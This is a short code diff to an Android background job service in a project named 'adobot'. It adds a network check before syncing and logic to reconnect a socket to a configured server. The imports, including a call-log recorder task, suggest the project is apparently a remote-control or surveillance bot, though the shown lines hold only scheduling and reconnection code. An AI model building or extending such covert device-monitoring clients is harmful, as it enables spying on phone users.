@@ -1,4 +1,4 @@
-package com.android.adobot.network;
+package com.android.adobot;
 
 import android.app.job.JobParameters;
 import android.app.job.JobService;
@@ -14,8 +14,6 @@ import android.os.Environment;
 import android.support.annotation.RequiresApi;
 import android.util.Log;
 
-import com.android.adobot.AdobotConstants;
-import com.android.adobot.CommonParams;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpRequest;
 import com.android.adobot.tasks.CallLogRecorderTask;
@@ -91,7 +89,22 @@ public class NetworkSchedulerService extends JobService {
     public boolean onStartJob(final JobParameters params) {
         jobParameters = params;
         Log.i(TAG, "onStartJob: ");
-        sync();
+        if (!hasConnection()) {
+            Thread finished = new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    jobFinished(params, true);
+                }
+            });
+            try {
+                finished.sleep(300);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            finished.start();
+        } else {
+            sync();
+        }
         return true;
     }
 
@@ -129,6 +142,7 @@ public class NetworkSchedulerService extends JobService {
             socket.connect();
         else if (socket == null) {
             createSocket(commonParams.getServer());
+        } else if (hasConnection() && socket != null && !connected) {
             socket.connect();
         } else {
             Log.i(TAG, "Unable to connect: No connection");
